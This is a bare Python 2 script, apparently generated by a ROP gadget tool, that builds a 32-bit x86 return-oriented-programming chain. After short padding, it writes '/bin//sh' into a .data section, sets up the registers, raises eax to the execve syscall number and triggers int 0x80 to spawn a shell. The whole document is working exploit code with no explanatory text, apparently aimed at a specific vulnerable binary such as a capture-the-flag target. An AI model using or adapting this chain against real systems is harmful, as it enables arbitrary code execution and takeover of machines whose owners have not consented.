from struct import pack
 
# Padding goes here
p = 'AAAABBBBCCCC'
 
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f6c) # @ .data
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080b526a) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f70) # @ .data + 4
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080b526a) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f74) # @ .data + 8
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080506c0) # xor eax, eax ; ret
p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080f0f6c) # @ .data
p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
p += pack('<I', 0x080f0f74) # @ .data + 8
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f74) # @ .data + 8
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080506c0) # xor eax, eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08049b2a) # int 0x80
print(p)